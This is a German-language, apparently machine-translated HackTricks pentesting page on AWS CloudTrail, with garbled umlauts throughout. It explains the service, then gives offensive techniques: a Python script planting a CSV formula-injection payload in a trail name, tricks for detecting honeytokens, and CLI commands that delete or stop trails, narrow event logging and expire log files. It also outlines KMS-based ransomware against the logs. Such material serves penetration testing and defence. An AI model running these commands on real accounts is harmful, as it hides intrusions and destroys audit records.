# AWS - CloudTrail Enum

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositorys senden.

</details>

## **CloudTrail**

AWS CloudTrail **zeichnet und √ºberwacht Aktivit√§ten in Ihrer AWS-Umgebung auf**. Es erfasst detaillierte **Ereignisprotokolle**, einschlie√ülich wer was, wann und von wo aus getan hat, f√ºr alle Interaktionen mit AWS-Ressourcen. Dies bietet eine Audit-Trail von √Ñnderungen und Aktionen, die bei der Sicherheitsanalyse, der Compliance-Pr√ºfung und der Verfolgung von Ressourcen√§nderungen helfen. CloudTrail ist unerl√§sslich, um das Benutzer- und Ressourcenverhalten zu verstehen, Sicherheitspositionen zu verbessern und die Einhaltung gesetzlicher Vorschriften sicherzustellen.

Jedes protokollierte Ereignis enth√§lt:

* Der Name des aufgerufenen API: `eventName`
* Der aufgerufene Dienst: `eventSource`
* Die Zeit: `eventTime`
* Die IP-Adresse: `SourceIPAddress`
* Die Agentenmethode: `userAgent`. Beispiele:
* Signing.amazonaws.com - Aus der AWS Management Console
* console.amazonaws.com - Root-Benutzer des Kontos
* lambda.amazonaws.com - AWS Lambda
* Die Anforderungsparameter: `requestParameters`
* Die Antwortelemente: `responseElements`

Ereignisse werden **ungef√§hr alle 5 Minuten in einer JSON-Datei in eine neue Protokolldatei geschrieben**, die von CloudTrail aufbewahrt wird und schlie√ülich werden die Protokolldateien **ungef√§hr 15 Minuten sp√§ter an S3 √ºbermittelt**.\
CloudTrail-Protokolle k√∂nnen **√ºber Konten und Regionen hinweg aggregiert werden**.\
CloudTrail erm√∂glicht die Verwendung der Protokolldateiintegrit√§t, um √ºberpr√ºfen zu k√∂nnen, dass Ihre Protokolldateien seit der √úbermittlung durch CloudTrail unver√§ndert geblieben sind. Es erstellt einen SHA-256-Hash der Protokolle in einer Digest-Datei. Ein SHA-256-Hash der neuen Protokolle wird jede Stunde erstellt.\
Beim Erstellen eines Trails erm√∂glichen die Ereignisausw√§hler, den Trail f√ºr die Protokollierung von: Management-, Daten- oder Einblicke-Ereignissen anzugeben.

Die Protokolle werden in einem S3-Bucket gespeichert. Standardm√§√üig wird die Serverseitige Verschl√ºsselung verwendet (SSE-S3), sodass AWS den Inhalt f√ºr die Personen entschl√ºsselt, die darauf zugreifen k√∂nnen, aber f√ºr zus√§tzliche Sicherheit k√∂nnen Sie SSE mit KMS und Ihren eigenen Schl√ºsseln verwenden.

Die Protokolle werden in einem **S3-Bucket mit diesem Namensformat** gespeichert:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* Wobei der BucketName ist: **`aws-cloudtrail-logs-<accountid>-<random>`**
* Beispiel: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

In jedem Ordner hat jedes Protokoll einen **Namen nach diesem Format**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

Namenskonvention f√ºr Protokolldateien

![](<../../../../.gitbook/assets/image (29).png>)

Dar√ºber hinaus werden **Digest-Dateien (zur √úberpr√ºfung der Dateiintegrit√§t)** im **gleichen Bucket** unter folgendem Pfad gespeichert:

![](<../../../../.gitbook/assets/image (22).png>)

### Protokolle aus mehreren Konten aggregieren

* Erstellen Sie einen Trail im AWS-Konto, in dem Sie m√∂chten, dass die Protokolldateien zugestellt werden
* Weisen Sie Berechtigungen f√ºr den Ziel-S3-Bucket zu, die den plattform√ºbergreifenden Zugriff f√ºr CloudTrail erm√∂glichen und erlauben Sie jedem AWS-Konto, das Zugriff ben√∂tigt
* Erstellen Sie in den anderen AWS-Konten einen neuen Trail und w√§hlen Sie aus, den im Schritt 1 erstellten Bucket zu verwenden

Auch wenn Sie alle Protokolle im gleichen S3-Bucket speichern k√∂nnen, k√∂nnen Sie CloudTrail-Protokolle aus mehreren Konten nicht in einem CloudWatch-Protokoll aggregieren, das zu einem einzigen AWS-Konto geh√∂rt.

{% hint style="danger" %}
Denken Sie daran, dass ein Konto **verschiedene Trails** von CloudTrail **aktiviert** haben kann, die dieselben (oder unterschiedliche) Protokolle in verschiedenen Buckets speichern.
{% endhint %}

### CloudTrail von allen Org-Konten in 1

Beim Erstellen eines CloudTrails ist es m√∂glich anzugeben, CloudTrail f√ºr alle Konten in der Organisation zu aktivieren und die Protokolle in nur 1 Bucket zu erhalten:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

Auf diese Weise k√∂nnen Sie CloudTrail in allen Regionen aller Konten einfach konfigurieren und die Protokolle in 1 Konto zentralisieren (das Sie sch√ºtzen sollten).

### √úberpr√ºfung von Protokolldateien

Sie k√∂nnen √ºberpr√ºfen, dass die Protokolle nicht ge√§ndert wurden, indem Sie Folgendes ausf√ºhren

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Protokolle an CloudWatch senden

**CloudTrail kann automatisch Protokolle an CloudWatch senden, damit Sie Warnungen einrichten k√∂nnen, die Sie benachrichtigen, wenn verd√§chtige Aktivit√§ten durchgef√ºhrt werden.**\
Beachten Sie, dass zur Erlaubnis f√ºr CloudTrail, die Protokolle an CloudWatch zu senden, eine **Rolle** erstellt werden muss, die diese Aktion erm√∂glicht. Wenn m√∂glich, wird empfohlen, die Standardrolle von AWS f√ºr diese Aktionen zu verwenden. Diese Rolle erm√∂glicht es CloudTrail:

* CreateLogStream: Dies erm√∂glicht das Erstellen von CloudWatch Logs-Protokollstr√∂men
* PutLogEvents: √úbermitteln von CloudTrail-Protokollen an CloudWatch Logs-Protokollstrom

### Ereignisverlauf

Der CloudTrail-Ereignisverlauf erm√∂glicht es Ihnen, in einer Tabelle die aufgezeichneten Protokolle zu inspizieren:

![](<../../../../.gitbook/assets/image (24).png>)

### Erkenntnisse

**CloudTrail Insights** analysiert automatisch Schreibverwaltungsereignisse von CloudTrail-Trails und **benachrichtigt** Sie √ºber **ungew√∂hnliche Aktivit√§ten**. Wenn beispielsweise eine Zunahme von `TerminateInstance`-Ereignissen vorliegt, die sich von den festgelegten Grundlinien unterscheidet, wird dies als Insight-Ereignis angezeigt. Diese Ereignisse erleichtern das **Auffinden und Reagieren auf ungew√∂hnliche API-Aktivit√§ten**.

Die Erkenntnisse werden im selben Bucket wie die CloudTrail-Protokolle gespeichert unter: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Sicherheit

| Integrit√§t der CloudTrail-Protokolldatei | <ul><li>√úberpr√ºfen, ob Protokolle manipuliert wurden (ge√§ndert oder gel√∂scht)</li><li><p>Verwendet Digest-Dateien (erstellt Hash f√ºr jede Datei)</p><ul><li>SHA-256-Hashing</li><li>SHA-256 mit RSA f√ºr die digitale Signierung</li><li>privater Schl√ºssel im Besitz von Amazon</li></ul></li><li>Es dauert 1 Stunde, um eine Digest-Datei zu erstellen (wird jede Stunde durchgef√ºhrt)</li></ul> |
| ---------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Unberechtigten Zugriff stoppen            | <ul><li><p>Verwenden von IAM-Richtlinien und S3-Bucket-Richtlinien</p><ul><li>Sicherheitsteam ‚Äî> Adminzugriff</li><li>Pr√ºfer ‚Äî> Nur-Lesezugriff</li></ul></li><li>Verwenden von SSE-S3/SSE-KMS zur Verschl√ºsselung der Protokolle</li></ul>                                                                                                                                        |
| Verhindern, dass Protokolldateien gel√∂scht werden | <ul><li>Einschr√§nkung des L√∂schzugriffs mit IAM- und Bucket-Richtlinien</li><li>Konfigurieren von S3 MFA-L√∂schung</li><li>Validierung mit Protokollvalidierung</li></ul>                                                                                                                                                                                            |

## Zugriffsberater

Der AWS Access Advisor st√ºtzt sich auf die letzten 400 Tage der AWS **CloudTrail-Protokolle, um seine Erkenntnisse zu sammeln**. CloudTrail erfasst eine Historie der AWS-API-Aufrufe und zugeh√∂rigen Ereignisse, die in einem AWS-Konto durchgef√ºhrt wurden. Der Zugriffsberater nutzt diese Daten, um **anzuzeigen, wann Dienste zuletzt aufgerufen wurden**. Durch die Analyse von CloudTrail-Protokollen kann der Zugriffsberater feststellen, auf welche AWS-Dienste ein IAM-Benutzer oder eine Rolle zugegriffen hat und wann dieser Zugriff erfolgt ist. Dies hilft AWS-Administratoren, fundierte Entscheidungen √ºber **die Feinabstimmung von Berechtigungen** zu treffen, da sie Dienste identifizieren k√∂nnen, die √ºber einen l√§ngeren Zeitraum nicht aufgerufen wurden, und m√∂glicherweise √ºberm√§√üig breite Berechtigungen basierend auf tats√§chlichen Nutzungsverhalten reduzieren k√∂nnen.

{% hint style="success" %}
Daher informiert der Zugriffsberater √ºber **die unn√∂tigen Berechtigungen, die Benutzern erteilt werden**, damit der Administrator sie entfernen kann.
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Aktionen

### Enumeration
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV-Injektion**

Es ist m√∂glich, eine CSV-Injektion in CloudTrail durchzuf√ºhren, die beliebigen Code ausf√ºhrt, wenn die Protokolle in CSV exportiert und mit Excel ge√∂ffnet werden.\
Der folgende Code generiert einen Protokolleintrag mit einem schlechten Trail-Namen, der das Payload enth√§lt:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
F√ºr weitere Informationen zu CSV-Injections besuchen Sie die Seite:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

F√ºr weitere Informationen zu dieser spezifischen Technik besuchen Sie [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **Umgehung der Erkennung**

### HoneyTokens **Umgehung**

Honeytokens werden erstellt, um den **Abfluss sensibler Informationen zu erkennen**. Im Falle von AWS handelt es sich um **AWS-Schl√ºssel, deren Verwendung √ºberwacht wird**. Wenn etwas eine Aktion mit diesem Schl√ºssel ausl√∂st, hat jemand diesen Schl√ºssel gestohlen.

Diese √úberwachung erfolgt jedoch √ºber **CloudTrail**, und es gibt einige **AWS-Dienste, die keine Protokolle an CloudTrail senden** (siehe die [Liste hier](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Einige dieser Dienste werden mit einem **Fehler** antworten, der die **ARN der Schl√ºsselrolle** enth√§lt, wenn jemand Unbefugtes (der Honeytoken-Schl√ºssel) versucht darauf zuzugreifen.

Auf diese Weise kann ein **Angreifer die ARN des Schl√ºssels erhalten, ohne ein Protokoll auszul√∂sen**. In der ARN kann der Angreifer die **AWS-Kontonummer und den Namen** sehen. Es ist einfach, die Kontonummern und Namen der HoneyToken-Unternehmen zu identifizieren. Auf diese Weise kann ein Angreifer feststellen, ob es sich um einen HoneyToken handelt.

![](<../../../../.gitbook/assets/image (65).png>)

#### **HoneyTokens-Erkennung**

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) erkennt, ob ein Schl√ºssel zu [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)** geh√∂rt:**

* Wenn **`canarytokens.org`** im Rollennamen oder die Kontonummer **`534261010715`** in der Fehlermeldung erscheint.
* Bei neueren Tests verwenden sie das Konto **`717712589309`** und haben immer noch die Zeichenfolge **`canarytokens.com`** im Namen.
* Wenn **`SpaceCrab`** im Rollennamen in der Fehlermeldung erscheint.
* **SpaceSiren** verwendet **UUIDs** zur Generierung von Benutzernamen: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* Wenn der **Name wie zuf√§llig generiert aussieht**, besteht eine hohe Wahrscheinlichkeit, dass es sich um einen HoneyToken handelt.

{% hint style="danger" %}
Beachten Sie, dass alle √∂ffentlichen APIs, bei denen festgestellt wurde, dass sie keine CloudTrail-Protokolle erstellen, jetzt behoben sind. M√∂glicherweise m√ºssen Sie also Ihre eigenen finden...

Oder Sie k√∂nnen die **Kontonummer** aus dem **kodierten** im **Zugriffsschl√ºssel** erhalten, wie [**hier erkl√§rt**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) und die Kontonummer mit Ihrer Liste der Honeytokens AWS-Konten √ºberpr√ºfen:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print ("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
{% endhint %}

F√ºr weitere Informationen lesen Sie die [**urspr√ºngliche Forschung**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).

### Zugriff auf Drittanbieterinfrastruktur

Bestimmte AWS-Dienste werden **eine Infrastruktur erstellen**, wie z.B. **Datenbanken** oder **Kubernetes**-Cluster (EKS). Ein Benutzer, der **direkt mit diesen Diensten kommuniziert** (wie die Kubernetes-API), **verwendet nicht die AWS-API**, sodass CloudTrail diese Kommunikation nicht sehen kann.

Daher k√∂nnte ein Benutzer mit Zugriff auf EKS, der die URL der EKS-API entdeckt hat, lokal einen Token generieren und **direkt mit dem API-Dienst kommunizieren, ohne von CloudTrail erkannt zu werden**.

Weitere Informationen unter:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### √Ñndern der CloudTrail-Konfiguration

#### Trails l√∂schen
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Trails stoppen
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### Deaktivieren Sie das Logging in mehreren Regionen

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
{% endcode %}

#### Deaktivieren Sie das Protokollieren durch Ereignisausw√§hler

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

Im ersten Beispiel wird ein einzelner Ereignisausw√§hler als JSON-Array mit einem einzelnen Objekt bereitgestellt. Das `"ReadWriteType": "ReadOnly"` gibt an, dass der **Ereignisausw√§hler nur Leseereignisse erfassen soll** (so dass CloudTrail-Insights z. B. **keine Schreibeereignisse √ºberpr√ºfen** werden).

Sie k√∂nnen den Ereignisausw√§hler entsprechend Ihren spezifischen Anforderungen anpassen.

#### Protokollierung von L√∂schvorg√§ngen √ºber S3-Lifecycle-Richtlinie

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
### √Ñndern der Bucket-Konfiguration

* L√∂schen des S3-Buckets
* √Ñndern der Bucket-Richtlinie, um alle Schreibvorg√§nge des CloudTrail-Dienstes zu verweigern
* Hinzuf√ºgen einer Lebenszyklusrichtlinie zum S3-Bucket, um Objekte zu l√∂schen
* Deaktivieren des KMS-Schl√ºssels, der zur Verschl√ºsselung der CloudTrail-Protokolle verwendet wird

### Cloudtrail-Ransomware

#### S3-Ransomware

Sie k√∂nnten einen asymmetrischen Schl√ºssel generieren und CloudTrail die Daten mit diesem Schl√ºssel verschl√ºsseln lassen und den privaten Schl√ºssel l√∂schen, sodass der Inhalt von CloudTrail nicht wiederhergestellt werden kann.\
Dies ist im Grunde genommen eine **S3-KMS-Ransomware**, die in folgendem Artikel erkl√§rt wird:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMS-Ransomware**

Dies ist eine einfachere M√∂glichkeit, den vorherigen Angriff mit unterschiedlichen Berechtigungsanforderungen durchzuf√ºhren:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Referenzen**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie m√∂chten, dass Ihr **Unternehmen in HackTricks beworben wird** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
